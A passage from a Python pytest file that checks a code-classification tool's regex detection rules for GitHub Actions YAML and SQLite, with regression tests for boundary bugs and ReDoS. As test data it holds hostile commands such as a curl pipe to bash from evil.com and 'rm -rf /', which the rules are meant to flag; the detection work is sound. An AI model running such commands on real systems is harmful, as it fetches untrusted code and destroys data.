    assert not bitwise_ops.search("{ $_.Name }")


YAML_RULES = LANGUAGE_DEFINITIONS["yaml"]["rules"]

_YAML_SIMPLE_CASES = [
    # (signature, positive snippet, text expected to NOT match / None to skip)
    ("branch", "run: if [ -f file ]; then echo hi; fi", "run: echo hi"),
    ("args", "      with:\n        node-version: 18\n", "      run: npm install\n"),
    ("structural_boundaries", "    needs: build", "    name: My Job"),
    ("func_start", "      - run: npm test", "      - name: Run tests"),
    ("class_start", "jobs:\n", "on:\n  push:\n"),
    ("safety", "permissions:\n  contents: read", "permissions:\n  contents: write"),
    (
        "safety_bypasses",
        "run: curl https://evil.com/x.sh | bash",
        "run: curl https://example.com/data.json -o data.json",
    ),
    ("high_risk_execution", "run: rm -rf /", "run: rm -rf /tmp/cache"),
    ("io", "run: apt-get install -y curl", "run: echo done"),
    ("api", "on:\n  push:\n    branches: [main]\n", "on:\n  schedule:\n    - cron: '0 0 * * *'\n"),
    ("state_mutation", "env:\n  NODE_ENV: production\n", "outputs:\n  result: success\n"),
    ("dead_code", "  # run: rm -rf /", "  # This step cleans up temp files"),
    ("doc", "name: CI Pipeline", "on: push"),
    ("test", "run: npm test", "run: npm run build"),
    ("concurrency", "concurrency:\n  group: ci-${{ github.ref }}\n", "strategy:\n  fail-fast: false\n"),
    ("globals", "run: echo ${{ github.actor }}", "run: echo hello"),
    (
        "reflection_metaprogramming",
        "value: ${{ fromJson(needs.build.outputs.matrix) }}",
        "value: ${{ needs.build.outputs.matrix }}",
    ),
    ("import", "      - uses: actions/checkout@v4", "      - run: npm install"),
    ("planned_debt", "  # TODO: add caching", "  # This step installs deps"),
    ("fragile_debt", "  # HACK: workaround for flaky test", "  # Normal comment"),
    ("events", "  schedule:\n    - cron: '0 0 * * *'\n", "  push:\n    branches: [main]\n"),
    ("dependency_injection", "env:\n  TOKEN: ${{ secrets.GITHUB_TOKEN }}\n", "env:\n  TOKEN: ${{ github.token }}\n"),
    ("telemetry", "run: echo '::warning::Something looks off'", "run: echo hello"),
    ("debug_prints", "run: echo 'debug info'", "run: npm install"),
    ("panics_and_aborts", "run: exit 1", "run: exit 0"),
    ("thread_sleeps", "run: sleep 5", "run: sleep"),
    (
        "immutability_locks",
        "uses: actions/checkout@a4f6be9e6c9d6b6c8cf1e2f1a3f5c7e9d0a1b2c3",
        "uses: actions/checkout@v4",
    ),
    ("listeners", "webhook: http://example.com/hook", "endpoint: http://example.com/hook"),
    ("test_skip", "run: npm test -- --passWithNoTests", "run: npm test"),
]


@pytest.mark.parametrize("signature,positive,negative", _YAML_SIMPLE_CASES)
def test_yaml_signature_positive_and_negative(signature, positive, negative):
    pattern = YAML_RULES[signature]
    assert pattern is not None, f"yaml's {signature!r} rule is unexpectedly None"
    assert pattern.search(positive), f"yaml {signature!r} failed to match its own documented positive case"
    if negative is not None:
        assert not pattern.search(negative), (
            f"yaml {signature!r} incorrectly matched an excluded/negative case: {negative!r}"
        )


def test_yaml_high_risk_execution_root_delete_trailing_boundary_regression():
    """
    Regression test: the shared trailing `\\b` after the `rm -rf /`
    alternative required a word character immediately following the `/`
    -- never true for how this destructive payload is actually written
    (as the entire `run:` command, followed by end-of-line/end-of-string,
    both non-word). The single most common real-world form of this
    supply-chain-sabotage payload never matched at all.
    """
    pattern = YAML_RULES["high_risk_execution"]
    assert pattern.search("run: rm -rf /"), "bare 'rm -rf /' still didn't match"
    assert pattern.search("run: rm -rf /\n")
    assert pattern.search("run: rm -rf /2"), "digit-following form regressed"
    assert not pattern.search("run: rm -rf /tmp/cache"), "path-following form incorrectly matched"
    assert pattern.search('run: eval "$CMD"')
    assert pattern.search("run: exec /bin/sh")


def test_yaml_test_skip_double_dash_flag_leading_boundary_regression():
    """
    Regression test: `--passWithNoTests` and `--no-audit` both start with
    `-` (non-word), so the shared leading `\\b` could only fire when a
    word char immediately preceded the `-` -- never true for how these
    flags are actually written (always preceded by whitespace, e.g. after
    `--` or a command name). Both never matched at all.
    """
    pattern = YAML_RULES["test_skip"]
    assert pattern.search("run: npm test -- --passWithNoTests"), "--passWithNoTests still didn't match"
    assert pattern.search("run: pytest --no-audit"), "--no-audit still didn't match"
    assert pattern.search("run: skipTests")
    assert pattern.search("run: npm test || true")


def test_yaml_events_schedule_anchor_regression():
    """
    Regression test: the `schedule:` alternative had no `^[ \\t]*` anchor
    (unlike its siblings `repository_dispatch:` and `cron:`), so it could
    match anywhere a line merely contained the substring `schedule:` --
    including keys like `release_schedule:` that have nothing to do with
    the GitHub Actions `on.schedule` trigger. Anchoring it to line-start
    fixes the false positive without affecting the real trigger form.
    """
    pattern = YAML_RULES["events"]
    assert pattern.search("  schedule:\n    - cron: '0 0 * * *'\n"), "real on.schedule trigger regressed"
    assert not pattern.search("release_schedule: weekly"), "unrelated key incorrectly matched"
    assert not pattern.search("  description: 'set the schedule: carefully'\n"), (
        "substring inside prose incorrectly matched"
    )


def test_yaml_telemetry_workflow_command_regression():
    """
    Regression test: the original pattern required `::debug`/`::warning`/
    `::error` to sit at the true start of a line (after only leading
    whitespace) followed by a space -- but GitHub Actions workflow
    commands are always emitted via `echo "::warning::msg"` (never as a
    bare line start), and the most common real form uses `::` directly
    after the keyword with no space at all (e.g. `::warning::msg`, vs.
    the rarer `::warning file=a,line=1::msg` parameter form). The
    anchored, space-only pattern never matched a single realistic
    workflow-command line.
    """
    pattern = YAML_RULES["telemetry"]
    assert pattern.search('run: echo "::warning::Deprecated API used"'), "no-space :: form still didn't match"
    assert pattern.search('run: echo "::error file=app.js,line=1::Something broke"'), "space+params form regressed"
    assert pattern.search('run: echo "::debug::checkpoint reached"')
    assert not pattern.search("run: echo hello")


def test_yaml_reflection_metaprogramming_redos_immunity():
    """
    Regression test for a confirmed real O(n^2) ReDoS: the unbounded
    `[a-zA-Z]+` between `to[A-Z]` and the required `(` , combined with
    unanchored search, is quadratic on payloads packed with `to[A-Z]`
    starts that never reach a `(`. Confirmed genuine O(n^2) scaling
    (~0.02s/0.08s/0.30s/1.21s/4.84s at n=2k/4k/8k/16k/32k, ~4x per
    doubling) before being bounded to a generous-but-finite cap.
    """
    pattern = YAML_RULES["reflection_metaprogramming"]
    poison = "toA" * 40000
    assert_redos_immune(pattern, poison, timeout_sec=3.0)

    assert pattern.search("value: ${{ fromJson(needs.build.outputs.matrix) }}")
    assert pattern.search('run: node -e "console.log(x.toJson())"')
    assert pattern.search('run: node -e "console.log(x.toUpperCase())"')


def test_yaml_ambiguity_sweep_shared_literals_are_not_bugs():
    """
    Documents the automated ambiguity sweep's findings for yaml -- all
    confirmed genuine, intentional double-classifications via direct
    empirical verification against a realistic multi-section workflow
    file, not false positives:

    - `structural_boundaries` <-> `state_mutation` on an `env:` block:
      setting job/step environment variables is simultaneously a
      structural section boundary AND a state mutation (it reassigns
      environment state) -- both are correct.
    - `structural_boundaries` <-> `concurrency` on a `strategy:`/
      `matrix:` block: a parallel build matrix is simultaneously a
      structural section boundary AND a concurrency construct.
    - `class_start` <-> `import` on a job whose body is `uses:`/`image:`
      (a reusable-workflow-call or container job): the job definition is
      simultaneously an object-boundary (`class_start`) AND a dependency
      resolution (`import`) -- GitHub Actions genuinely conflates "define
      this job" and "import this reusable workflow/image" into the same
      syntax for that job shape.
    - `safety_bypasses` <-> `io` on `curl ... | bash`: the curl invocation
      is both a network I/O operation AND (piped to a shell) a classic
      supply-chain safety bypass -- correctly double-classified.
    - `import` <-> `immutability_locks` on a SHA-pinned `uses:` line: the
      dependency import and its immutability lock (SHA-1 pinning) are
      the same token by design -- `immutability_locks` exists
      specifically to detect this shape on `uses:` lines.
    """
    structural_boundaries = YAML_RULES["structural_boundaries"]
    state_mutation = YAML_RULES["state_mutation"]
    concurrency = YAML_RULES["concurrency"]
    class_start = YAML_RULES["class_start"]
    import_ = YAML_RULES["import"]
    safety_bypasses = YAML_RULES["safety_bypasses"]
    io = YAML_RULES["io"]
    immutability_locks = YAML_RULES["immutability_locks"]

    env_block = "env:\n  NODE_ENV: production\n"
    assert structural_boundaries.search(env_block)
    assert state_mutation.search(env_block)

    matrix_block = "strategy:\n  matrix:\n    node: [16, 18]\n"
    assert structural_boundaries.search(matrix_block)
    assert concurrency.search(matrix_block)

    reusable_job = "reusable:\n  uses: ./.github/workflows/other.yml\n"
    assert class_start.search(reusable_job)
    assert import_.search(reusable_job)

    curl_pipe = "run: curl https://example.com/install.sh | bash"
    assert safety_bypasses.search(curl_pipe)
    assert io.search(curl_pipe)

    pinned_uses = "      - uses: actions/checkout@a4f6be9e6c9d6b6c8cf1e2f1a3f5c7e9d0a1b2c3"
    assert import_.search(pinned_uses)
    assert immutability_locks.search(pinned_uses)


# ==============================================================================
# SQLITE: STRICT STRUCTURAL SIGNATURE COVERAGE (Issue #612)
# ==============================================================================
SQLITE_RULES = LANGUAGE_DEFINITIONS["sqlite"]["rules"]

_SQLITE_SIMPLE_CASES = [
    # (signature, positive snippet, text expected to NOT match / None to skip)
    ("branch", "CASE WHEN status = 1 THEN 'active' ELSE 'inactive' END", "SELECT id FROM users"),
    ("args", "SELECT * FROM t WHERE id = :id", "SELECT * FROM t WHERE id = 5"),
    ("structural_boundaries", "SELECT * FROM users", "PRAGMA foreign_keys = ON;"),
    (
        "func_start",
        "CREATE TRIGGER trg_users_audit AFTER UPDATE ON users BEGIN SELECT 1; END;",
        "CREATE TABLE users (id INTEGER);",
    ),
    (
        "class_start",
        "CREATE TABLE users (id INTEGER PRIMARY KEY);",
        "CREATE VIEW active_users AS SELECT * FROM users;",
    ),
    ("safety", "CREATE TABLE t (id INTEGER PRIMARY KEY, CHECK (id > 0));", "SELECT * FROM t;"),
    ("safety_bypasses", "DROP TABLE IF EXISTS staging;", "CREATE TABLE staging (id INTEGER);"),
    ("high_risk_execution", ".shell ls -la", "SELECT 1;"),
    ("io", "SELECT * FROM users;", "BEGIN TRANSACTION;"),
    ("api", "CREATE VIEW active_users AS SELECT * FROM users;", "CREATE TABLE users (id INTEGER);"),
    ("state_mutation", "UPDATE users SET status = 'inactive' WHERE id = 1;", "SELECT * FROM users;"),
    ("dead_code", "-- SELECT * FROM old_table", "-- This is just a comment"),
    ("doc", "-- @param id The user id", "-- just a note"),
    ("test", "EXPLAIN QUERY PLAN SELECT * FROM users;", "SELECT * FROM users;"),
    ("concurrency", "BEGIN EXCLUSIVE;", "BEGIN;"),
    ("globals", "SELECT * FROM sqlite_master;", "SELECT * FROM users;"),
    ("decorators", "SELECT * FROM t INDEXED BY idx_t_x WHERE x = 1;", "SELECT * FROM t WHERE x = 1;"),
    ("generics", "SELECT CAST(x AS INTEGER) FROM t;", "SELECT x FROM t;"),
    (
        "comprehensions",
        "SELECT ROW_NUMBER() OVER (PARTITION BY dept ORDER BY salary) FROM emp;",
        "SELECT dept, salary FROM emp;",
    ),
    ("scientific", "SELECT sqrt(4);", "SELECT 4;"),
    (
        "reflection_metaprogramming",
        "WITH RECURSIVE counter(x) AS (SELECT 1 UNION ALL SELECT x+1 FROM counter WHERE x<10) SELECT * FROM counter;",
        "SELECT * FROM counter;",
    ),
    ("import", "ATTACH DATABASE 'other.db' AS other;", "SELECT * FROM other.t;"),
    ("ownership", "-- Author: Jane Doe", "-- just a comment"),
    ("planned_debt", "-- TODO: add index on created_at", "-- normal comment"),
    ("fragile_debt", "-- HACK: workaround for legacy bug", "-- normal comment"),
    ("spec_exposure", "-- [SPEC-123] audit trail requirements", "-- normal comment"),
    ("events", "CREATE TRIGGER trg AFTER UPDATE ON t BEGIN SELECT 1; END;", "CREATE TABLE t (id INTEGER);"),
    ("dependency_injection", "SELECT load_extension('json1');", "SELECT * FROM t;"),
    ("macros", "PRAGMA compile_options;", "PRAGMA foreign_keys = ON;"),
    ("memory_alloc", "PRAGMA mmap_size = 268435456;", "PRAGMA foreign_keys = ON;"),
    ("telemetry", "ANALYZE;", "SELECT 1;"),
    ("debug_prints", ".print 'debug'", "SELECT 1;"),
    ("explicit_casts", "SELECT CAST(x AS INTEGER);", "SELECT x;"),
    ("panics_and_aborts", "SELECT RAISE(ABORT, 'blocked');", "SELECT 1;"),
    ("thread_sleeps", "PRAGMA busy_timeout = 5000;", "PRAGMA foreign_keys = ON;"),
    ("bitwise_ops", "SELECT x >> 2;", "SELECT x + 2;"),
    ("sync_locks", "BEGIN EXCLUSIVE;", "BEGIN;"),
    ("immutability_locks", "CREATE TABLE t (id INTEGER) STRICT;", "CREATE TABLE t (id INTEGER);"),
    ("cleanup", "VACUUM;", "SELECT 1;"),
    ("encapsulation", "CREATE TEMP TABLE staging (id INTEGER);", "CREATE TABLE staging (id INTEGER);"),
    ("listeners", "CREATE TRIGGER trg BEFORE INSERT ON t BEGIN SELECT 1; END;", "CREATE TABLE t (id INTEGER);"),
    ("test_skip", ".testcase skip", "SELECT 1;"),
    ("serialization_parsing", "SELECT json_extract(data, '$.id') FROM t;", "SELECT data FROM t;"),
    ("regex_execution", "SELECT * FROM t WHERE x REGEXP '^a';", "SELECT * FROM t WHERE x = 'a';"),
    ("time_date_logic", "SELECT datetime('now');", "SELECT 1;"),
    ("ipc_rpc_bridges", "ATTACH DATABASE 'other.db' AS other;", "SELECT 1;"),
]


@pytest.mark.parametrize("signature,positive,negative", _SQLITE_SIMPLE_CASES)
def test_sqlite_signature_positive_and_negative(signature, positive, negative):
    pattern = SQLITE_RULES[signature]
    assert pattern is not None, f"sqlite's {signature!r} rule is unexpectedly None"
    assert pattern.search(positive), f"sqlite {signature!r} failed to match its own documented positive case"
    if negative is not None:
        assert not pattern.search(negative), (
            f"sqlite {signature!r} incorrectly matched an excluded/negative case: {negative!r}"
        )


def test_sqlite_dependency_capture_extracts_path():
    """
    _dependency_capture is paired with `import` and must extract the exact
    dependency path/module string into a capture group, not just detect
    presence. Covers all three import shapes sqlite supports.
    """
    pattern = SQLITE_RULES["_dependency_capture"]

    m = pattern.search("ATTACH DATABASE 'other.db' AS other;")
    assert m and m.group(1) == "other.db"

    m = pattern.search("SELECT load_extension('json1');")
    assert m and m.group(2) == "json1"

    m = pattern.search(".import data.csv mytable")
    assert m and m.group(3) == "data.csv"


def test_sqlite_high_risk_execution_dot_command_leading_boundary_and_case_regression():
    """
    Regression test for two compounded bugs in the same rule:

    1. `.shell`/`.system`/`.exit`/`.quit` all start with `.` (non-word), so
       the shared leading `\\b` inside `\\b(...)\\b` could only fire when a
       word char immediately preceded the `.` -- never true for how these
       sqlite3 CLI dot-commands are actually written (always the first
       token on a line, preceded only by whitespace or nothing). All four
       of the CLI's process-killing/shell-escape commands never matched at
       all.
    2. The rule also had no `re.I` flag at all (every sibling Phase-2 rule
       does), so even the keyword alternatives (`PRAGMA legacy_alter_table`,
       `DROP DATABASE`) were silently case-sensitive-only and missed
       lowercase SQL, which is extremely common in real migration scripts.

    Fixed by pulling the dot-commands out into a `^[ \\t]*\\.` anchored
    alternative (matching the pattern already used correctly by
    import/debug_prints/telemetry/macros/dependency_injection) and adding
    `re.I`.
    """
    pattern = SQLITE_RULES["high_risk_execution"]
    assert pattern.search(".shell ls -la"), ".shell still didn't match"
    assert pattern.search(".system ls"), ".system still didn't match"
    assert pattern.search(".exit"), ".exit still didn't match"
    assert pattern.search(".quit"), ".quit still didn't match"
    assert pattern.search("pragma legacy_alter_table=1;"), "lowercase PRAGMA still didn't match"
    assert pattern.search("drop database foo;"), "lowercase DROP DATABASE still didn't match"
    assert pattern.search("DROP DATABASE foo;"), "uppercase form regressed"


def test_sqlite_io_dot_command_leading_boundary_regression():
    """
    Regression test: `.import`/`.output`/`.dump`/`.read` all start with `.`
    (non-word), so the shared leading `\\b` inside `\\b(...)\\b` could only
    fire when a word char immediately preceded the `.` -- never true for
    how these sqlite3 CLI I/O dot-commands are actually written (always
    the first token on a line). All four never matched at all.
    """
    pattern = SQLITE_RULES["io"]
    assert pattern.search(".import data.csv mytable"), ".import still didn't match"
    assert pattern.search(".output out.txt"), ".output still didn't match"
    assert pattern.search(".dump"), ".dump still didn't match"
    assert pattern.search(".read script.sql"), ".read still didn't match"
    assert pattern.search("SELECT * FROM users;"), "SELECT regressed"


def test_sqlite_test_dot_command_leading_boundary_regression():
    """
    Regression test: `.lint`/`.testcase` both start with `.` (non-word), so
    the shared leading `\\b` inside `\\b(...)\\b` could only fire when a
    word char immediately preceded the `.` -- never true for how these
    dot-commands are actually written. Both never matched at all.
    """
    pattern = SQLITE_RULES["test"]
    assert pattern.search(".lint fkey-indexes"), ".lint still didn't match"
    assert pattern.search(".testcase foo"), ".testcase still didn't match"
    assert pattern.search("EXPLAIN QUERY PLAN SELECT * FROM users;"), "EXPLAIN QUERY PLAN regressed"


def test_sqlite_unanchored_dot_command_false_positive_regression():
    """
    Regression test for the mirror-image bug of the leading-boundary cases
    above: `panics_and_aborts` (`.exit`/`.quit`), `thread_sleeps`
    (`.pause`), and `test_skip` (`.testcase skip`) each referenced their
    dot-command as a bare, unanchored literal with no `\\b` at all. Since
    a bare `.exit` is just a substring, it matched inside completely
    ordinary qualified column references like `app.exitcode` or
    `s.pause_time` -- a table-qualified column happening to start with the
    same letters as the CLI command. Anchored each to `^[ \\t]*\\.`
    (line-start), matching the correct existing pattern used elsewhere in
    this dict, which eliminates the false positive without affecting the
    real dot-command usage.
    """
    panics = SQLITE_RULES["panics_and_aborts"]
    assert panics.search(".exit"), "real .exit dot-command regressed"
    assert panics.search(".quit"), "real .quit dot-command regressed"
    assert not panics.search("SELECT s.exitcode FROM sessions s;"), (
        "panics_and_aborts incorrectly matched a qualified column reference"
    )
    assert panics.search("RAISE(ABORT, 'x');"), "keyword form regressed"

    sleeps = SQLITE_RULES["thread_sleeps"]
    assert sleeps.search(".pause"), "real .pause dot-command regressed"
    assert not sleeps.search("SELECT s.pause_time FROM sessions s;"), (
        "thread_sleeps incorrectly matched a qualified column reference"
    )
    assert sleeps.search("PRAGMA busy_timeout = 5000;"), "PRAGMA form regressed"

    skip = SQLITE_RULES["test_skip"]
    assert skip.search(".testcase skip"), "real .testcase skip dot-command regressed"
    assert not skip.search("UPDATE t SET note='x.testcase skip flaky';"), (
        "test_skip incorrectly matched inside a string literal"
    )
    assert skip.search("PRAGMA ignore_check_constraints = 1;"), "PRAGMA form regressed"


def test_sqlite_comprehensions_over_trailing_boundary_regression():
    """
    Regression test: the shared trailing `\\b` after the `OVER\\s*\\([^)]*\\)`
    alternative required a word character immediately following the
    closing `)` -- never true for how a window-function clause is
    actually written (always followed by `;`, whitespace, a comma, or
    end-of-string, all non-word). SQLite's `OVER (...)` window-function
    syntax -- this signature's whole reason for existing -- never matched
    at all. Fixed by dropping the trailing `\\b` for that alternative (the
    `)` is already self-delimiting, same principle as Rule 10).
    """
    pattern = SQLITE_RULES["comprehensions"]
    assert pattern.search("SELECT ROW_NUMBER() OVER (PARTITION BY x ORDER BY y);"), (
        "OVER(...) followed by ';' still didn't match"
    )
    assert pattern.search("SELECT ROW_NUMBER() OVER (PARTITION BY x ORDER BY y)"), (
        "OVER(...) at end-of-string still didn't match"
    )
    assert pattern.search("SELECT ROW_NUMBER() OVER (ORDER BY y), name FROM t"), (
        "OVER(...) followed by ',' still didn't match"
    )
    assert pattern.search("SELECT json_each.value FROM json_each(t.tags);"), "json_each regressed"


def test_sqlite_explicit_casts_nested_paren_regression():
    """
    Regression test (Rule 11, nested-delimiter coverage): the flat negated
    class `[^)]+` between `CAST(` and the required `AS <type>)` couldn't
    represent one level of nested parens, so any CAST wrapping a nested
    function call -- extremely idiomatic SQLite
    (`CAST(json_extract(data,'$.id') AS INTEGER)`,
    `CAST(COALESCE(x, 0) AS INTEGER)`) -- never matched at all, unlike the
    identical form with a bare column. Fixed with a bounded one-level
    nesting form: `(?:[^()]{0,500}|\\([^()]{0,500}\\)){0,500}`.
    """
    pattern = SQLITE_RULES["explicit_casts"]
    assert pattern.search("SELECT CAST(x AS INTEGER);"), "plain CAST regressed"
    assert pattern.search("SELECT CAST(json_extract(data,'$.id') AS INTEGER);"), (
        "CAST wrapping json_extract(...) still didn't match"
    )
    assert pattern.search("SELECT CAST(COALESCE(a, 0) AS INTEGER);"), "CAST wrapping COALESCE(...) still didn't match"


def test_sqlite_dead_code_comment_style_completeness_regression():
    """
    Regression test (Rule 12): sqlite's `lexical_family` is
    `multi_style_dash`, meaning both `--` line comments AND `/* */` block
    comments are valid non-executable text. The original `dead_code`
    regex only checked the `--` prefix, so commented-out DDL/DML written
    with a `/* ... */` block comment -- an equally common style for
    temporarily disabling a chunk of SQL -- never fired at all. Fixed to
    check both markers.
    """
    pattern = SQLITE_RULES["dead_code"]
    assert pattern.search("-- SELECT * FROM old_table"), "'--' style regressed"
    assert pattern.search("/* SELECT * FROM old_table */"), "'/* */' style still didn't match"
    assert pattern.search("/* INSERT INTO t VALUES (1) */"), "'/* */' style with INSERT still didn't match"


def test_sqlite_reflection_metaprogramming_virtual_table_false_collision_regression():
    """
    Ambiguity-sweep finding, confirmed a real bug: the bare `VIRTUAL`
    alternative was intended to catch the storage mode of a generated
    column (`GENERATED ALWAYS AS (expr) VIRTUAL`), per this rule's own doc
    comment ("Recursive logic and JSON paths"). But as a standalone
    keyword it also fired on the completely unrelated and far more common
    `CREATE VIRTUAL TABLE ... USING fts5(...)` construct (SQLite's
    full-text-search/extension-module table syntax), which is not
    generated-column metaprogramming at all. Fixed by requiring
    `STORED`/`VIRTUAL` to actually follow a `GENERATED ALWAYS AS (...)`
    clause.
    """
    pattern = SQLITE_RULES["reflection_metaprogramming"]
    assert pattern.search("price_with_tax INTEGER GENERATED ALWAYS AS (price * 1.08) STORED"), (
        "real generated-column STORED form regressed"
    )
    assert pattern.search("price_with_tax INTEGER GENERATED ALWAYS AS (price * 1.08) VIRTUAL"), (
        "real generated-column VIRTUAL form regressed"
    )
    assert not pattern.search("CREATE VIRTUAL TABLE fts USING fts5(body);"), (
        "incorrectly classified an unrelated CREATE VIRTUAL TABLE as metaprogramming"
    )
    assert pattern.search("WITH RECURSIVE counter(x) AS (SELECT 1)"), "WITH RECURSIVE regressed"


def test_sqlite_bitwise_ops_json_arrow_false_collision_regression():
    """
    Ambiguity-sweep finding, confirmed a real bug: bitwise_ops' bare `>>`
    alternative matched as a substring inside sqlite's `->>` "extract as
    text" JSON path operator, misclassifying every JSON field access as a
    bitwise right-shift. Fixed with a negative lookbehind excluding `>>`
    when immediately preceded by `-`.
    """
    bitwise_ops = SQLITE_RULES["bitwise_ops"]
    reflection = SQLITE_RULES["reflection_metaprogramming"]

    json_arrow = "SELECT data ->> '$.id' FROM events;"
    assert reflection.search(json_arrow)
    assert not bitwise_ops.search(json_arrow), "bitwise_ops incorrectly matched inside the '->>' JSON operator"

    real_shift = "SELECT x >> 2 FROM t;"
    assert bitwise_ops.search(real_shift), "real bitwise right-shift regressed"


def test_sqlite_class_start_end_of_string_boundary_regression():
    """
    Regression test: class_start's table-name lookahead was
    `(?=[ \\t\\(\\n;])`, missing the `|$` end-of-string alternative that
    func_start's near-identical lookahead already carries (added in an
    earlier fix for the exact same construct). A file whose final line is
    a bare `CREATE TABLE foo` with no trailing newline/paren/semicolon
    never matched.
    """
    pattern = SQLITE_RULES["class_start"]
    assert pattern.search("CREATE TABLE foo (id INTEGER);"), "normal mid-file form regressed"
    assert pattern.search("CREATE TABLE foo"), "end-of-string form (no trailing char) still didn't match"


def test_sqlite_redos_immunity():
    """
    Regression test for five confirmed real O(n^2) ReDoS vectors, all
    sharing the same root cause: a flat, unbounded negated-class delimiter
    matcher (`[^)]*`/`[^\\]]*`) combined with an unanchored search over a
    payload that repeats the opening anchor keyword/delimiter many times
    with no closing delimiter anywhere in the file. Each starting position
    then scans to the end of the file before failing, giving O(n^2) total
    work. Confirmed genuine ~4x-per-doubling scaling at n=2k/4k/8k/16k
    before bounding (e.g. explicit_casts: ~0.11s/0.43s/1.73s/6.95s;
    args (VALUES): ~0.015s/0.058s/0.23s/0.92s; generics (CAST):
    ~0.009s/0.036s/0.14s/0.57s; comprehensions (OVER):
    ~0.011s/0.044s/0.17s/0.69s; spec_exposure: ~0.04s/0.17s/0.69s/2.74s).
    All five bounded to generous-but-finite numeric caps.
    """
    assert_redos_immune(SQLITE_RULES["args"], "VALUES (" * 20000, timeout_sec=3.0)
    assert_redos_immune(SQLITE_RULES["args"], "x IN (" * 20000, timeout_sec=3.0)
    assert_redos_immune(SQLITE_RULES["generics"], "CAST(" * 20000, timeout_sec=3.0)
    assert_redos_immune(SQLITE_RULES["comprehensions"], "OVER (" * 20000, timeout_sec=3.0)
    assert_redos_immune(SQLITE_RULES["explicit_casts"], "CAST(" * 20000, timeout_sec=3.0)
    assert_redos_immune(SQLITE_RULES["spec_exposure"], "-- [SPEC-1 [" * 20000, timeout_sec=3.0)

    # Realistic-but-large inputs must still match after bounding.
    assert SQLITE_RULES["args"].search("INSERT INTO t VALUES (" + "1," * 400 + "1);")
    assert SQLITE_RULES["generics"].search("SELECT CAST(COALESCE(a, 0) AS INTEGER);")
    assert SQLITE_RULES["comprehensions"].search("SELECT ROW_NUMBER() OVER (PARTITION BY x ORDER BY y);")
    assert SQLITE_RULES["explicit_casts"].search("SELECT CAST(json_extract(data,'$.id') AS INTEGER);")
    assert SQLITE_RULES["spec_exposure"].search("-- [SPEC-123] audit trail")


def test_sqlite_ambiguity_sweep_shared_literals_are_not_bugs():
    """
    Documents the automated ambiguity sweep's findings for sqlite that are
    genuine, intentional double-classifications (not bugs) -- confirmed
    via direct empirical verification against realistic SQL:

    - `structural_boundaries` <-> `safety`/`immutability_locks` on
      `STRICT`: a STRICT table declaration is simultaneously a structural
      qualifier and an integrity/immutability guarantee -- all three
      rules deliberately list it.
    - `structural_boundaries` <-> `io` on `SELECT`: a SELECT is
      simultaneously query structure and a read I/O operation.
    - `func_start` <-> `api` on `CREATE VIEW`: a view is simultaneously
      executable query logic and explicitly public surface area.
    - `func_start` <-> `events` on `CREATE TRIGGER`: a trigger is
      simultaneously executable logic and an event-driven construct.
    - `events` <-> `listeners` on `AFTER`/`BEFORE`: a trigger's timing
      keyword is simultaneously the event definition and the listener
      registration for it.
    - `scientific` <-> `regex_execution` on `MATCH`: sqlite overloads the
      `MATCH` operator across FTS5 full-text search (a text-ranking/
      analytical operation) and generic virtual-table pattern matching --
      both classifications are correct for the same operator.
    - `ipc_rpc_bridges`'s bare `PRAGMA` deliberately overlaps nearly every
      other PRAGMA-based rule (concurrency, safety, thread_sleeps,
      memory_alloc, macros, test) -- it is intentionally a broad
      catch-all for engine-control statements, not a bug to narrow.
    """
    structural_boundaries = SQLITE_RULES["structural_boundaries"]
    safety = SQLITE_RULES["safety"]
    immutability_locks = SQLITE_RULES["immutability_locks"]
    io = SQLITE_RULES["io"]
    func_start = SQLITE_RULES["func_start"]
    api = SQLITE_RULES["api"]
    events = SQLITE_RULES["events"]
    listeners = SQLITE_RULES["listeners"]
    scientific = SQLITE_RULES["scientific"]
    regex_execution = SQLITE_RULES["regex_execution"]
    ipc_rpc_bridges = SQLITE_RULES["ipc_rpc_bridges"]
    concurrency = SQLITE_RULES["concurrency"]

    strict_table = "CREATE TABLE t (id INTEGER) STRICT;"
    assert structural_boundaries.search(strict_table)
    assert safety.search(strict_table)
    assert immutability_locks.search(strict_table)

    select_stmt = "SELECT * FROM t;"
    assert structural_boundaries.search(select_stmt)
    assert io.search(select_stmt)

    view = "CREATE VIEW active_users AS SELECT * FROM users;"
    assert func_start.search(view)
    assert api.search(view)

    trigger = "CREATE TRIGGER trg AFTER UPDATE ON t BEGIN SELECT 1; END;"
    assert func_start.search(trigger)
    assert events.search(trigger)
    assert listeners.search(trigger)

    fts_match = "SELECT * FROM docs WHERE body MATCH 'sqlite';"
    assert scientific.search(fts_match)
    assert regex_execution.search(fts_match)

    pragma_wal = "PRAGMA journal_mode = WAL;"
    assert ipc_rpc_bridges.search(pragma_wal)
    assert concurrency.search(pragma_wal)


def test_sqlite_func_start_and_macros_no_collision():
    """
    Known ambiguity pattern from the issue template (a multi-line
    preprocessor/macro spiral fooling func_start, as found in C++): not
    applicable to sqlite. SQLite has no C-style textual preprocessor --
    `macros` here maps to `PRAGMA compile_options`/
    `sqlite_compileoption_used` (introspecting how the SQLite library
    itself was compiled) and the `.parameter set/init` CLI bind-parameter
    commands, none of which share any token with func_start's
    `CREATE TRIGGER/VIEW/INDEX` anchors. Empirically confirmed neither
    rule ever fires on the other's construct.
    """
    func_start = SQLITE_RULES["func_start"]
    macros = SQLITE_RULES["macros"]

    trigger = "CREATE TRIGGER trg AFTER UPDATE ON t BEGIN SELECT 1; END;"
    assert func_start.search(trigger)
    assert not macros.search(trigger)

    compile_opts = "PRAGMA compile_options;"
    assert macros.search(compile_opts)
    assert not func_start.search(compile_opts)


def test_sqlite_test_and_regex_execution_no_collision():
    """
    Known ambiguity pattern from the issue template (a `.test(`-style
    regex method miscounted as a test-framework call, as found in
    TypeScript): confirmed not applicable to sqlite. sqlite has no native
    `.test(`-style regex method -- `test` maps to
    `EXPLAIN QUERY PLAN`/`PRAGMA integrity_check`/`PRAGMA foreign_key_check`/
    the `.testcase`/`.lint` CLI commands, and `regex_execution` maps to the
    `REGEXP`/`GLOB`/`LIKE`/`MATCH` pattern-matching operators. These two
    vocabularies are fully disjoint; empirically confirmed neither rule
    ever fires on the other's construct.
    """
    test = SQLITE_RULES["test"]
    regex_execution = SQLITE_RULES["regex_execution"]

    regexp_query = "SELECT * FROM t WHERE x REGEXP '^a';"
    assert regex_execution.search(regexp_query)
    assert not test.search(regexp_query)

    eqp = "EXPLAIN QUERY PLAN SELECT * FROM t;"
    assert test.search(eqp)
    assert not regex_execution.search(eqp)


# ==============================================================================
# SHELL: STRICT STRUCTURAL SIGNATURE COVERAGE (Issue #610)
# ==============================================================================
SHELL_RULES = LANGUAGE_DEFINITIONS["shell"]["rules"]

